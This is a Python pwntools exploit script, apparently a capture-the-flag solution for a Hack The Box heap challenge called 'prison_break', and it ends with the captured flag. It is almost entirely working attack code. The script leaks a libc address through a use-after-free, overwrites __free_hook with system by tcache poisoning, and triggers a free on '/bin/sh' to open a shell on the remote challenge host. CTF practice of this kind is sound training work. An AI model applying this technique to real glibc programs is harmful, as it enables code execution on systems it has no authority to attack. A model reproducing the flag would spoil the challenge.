#!/usr/bin/env python3

from pwn import *

exe = ELF("./prison_break_patched")
libc = ELF("./glibc/libc.so.6")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.55.109", 42693)

    return r


def main():
    r = conn()
    input()
    def create(index, size, data):
        r.sendlineafter(b'# ', b'1')
        r.sendlineafter(b'index:\n', str(index).encode())
        r.sendlineafter(b'size:\n', str(size).encode())
        r.sendafter(b'data:\n', data)
    def delete(index):
        r.sendlineafter(b'# ', b'2')
        r.sendlineafter(b'index:\n', str(index).encode())
    def view(index):
        r.sendlineafter(b'# ', b'3')
        r.sendlineafter(b'index:\n', str(index).encode())
    def copy_paste(cpy_idx, pst_idx):
        r.sendlineafter(b'# ', b'4')
        r.sendlineafter(b'index:\n', str(cpy_idx).encode())
        r.sendlineafter(b'index:\n',str(pst_idx).encode())
    # create(0, 96, b'AAAA')
    # create(1, 96, b'AAAA')
    # delete(0)
    # delete(1)
    # create(2, 96, b'BBBB')
    # create(3, 16, b'CCCC')
    # delete(2)
    # create(4, 96, b'\x01')
    # view(4)
    # r.recvuntil(b'entry:\n')
    # heap_leak = u64(r.recv(6)+ b'\0\0')
    # heap = heap_leak - 0x201
    # info('Heap leak: ' + hex(heap_leak))
    # info('Heap: ' + hex(heap))
    # for i in range(8):
    #     create(i, 0x100, b'AAAA')
    # create(8, 10, b'BBBB')
    # for i in range(8):
    #     delete(i)
    # create(9, 0x120, b'C')
    # copy_paste(7, 9)
    # view(9)
    create(0, 0x500, b'A')
    create(1, 0x500, b'B')
    delete(0)
    copy_paste(0, 1)
    view(1)
    r.recvuntil(b'entry:\n')
    libc_leak = u64(r.recv(6) + b'\0\0')
    info('Libc leak: ' + hex(libc_leak))    
    libc.address = libc_leak - 0x3ebca0
    info('Libc address: ' + hex(libc.address))
    free_hook = libc.sym['__free_hook']
    system = libc.sym['system']
    info('Free hook: ' + hex(free_hook))
    create(2, 100, b'\0')
    # create(3, 100, p64(libc.sym['__malloc_hook']))
    create(3, 100, p64(free_hook))
    delete(2)
    copy_paste(3, 2)
    info('Malloc hook: ' + hex(libc.sym['__malloc_hook']))
    # one_gadget = libc.address + 0x10a428
    # create(2, 100, b'A')
    # create(4, 100, p64(one_gadget))
    create(2, 100, b'/bin/sh\0')
    create(4, 100, p64(system))
    pause()
    # create(5, 100, b'')
    r.sendlineafter(b'# ', b'2')
    r.sendlineafter(b'index:\n', b'2')
    pause()
    # good luck pwning :)
    # HTB{h4cky_pr1s0n_br34k_91600c335b1db53245e5d762cbceaa62}
    r.interactive()


if __name__ == "__main__":
    main()
